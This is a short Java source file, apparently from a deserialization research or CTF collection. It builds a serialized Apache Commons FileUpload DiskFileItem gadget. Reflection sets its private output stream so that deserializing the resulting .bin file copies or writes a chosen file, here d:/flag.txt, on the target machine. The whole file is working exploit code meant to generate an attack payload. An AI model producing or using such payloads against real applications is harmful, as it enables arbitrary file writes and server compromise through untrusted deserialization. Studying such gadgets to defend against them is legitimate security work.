package FileUpload;

/**
 * author:Firebasky
 */

import Tools.SerializeUtil;
import org.apache.commons.fileupload.disk.DiskFileItem;
import org.apache.commons.io.output.DeferredFileOutputStream;
import java.io.File;
import java.lang.reflect.Field;

public class FileUploadForCopy {
    public static String fileName = "FileUploadForCopy.bin";
    public static void main(String[] args)throws Exception {
        File src = new File("d:/flag.txt");
        File target = new File("d:/bbb");
        DeferredFileOutputStream dfos = new DeferredFileOutputStream(-1, src);
        //写入 大于阈值 写入硬盘
        DiskFileItem diskFileItem = new DiskFileItem(null, null, false, null, 0, target);
        Field dfosFile = DiskFileItem.class.getDeclaredField("dfos");
        dfosFile.setAccessible(true);
        dfosFile.set(diskFileItem, dfos);
        SerializeUtil.writeObjectToFile(diskFileItem, fileName);
        SerializeUtil.readFileObject(fileName);
    }
}
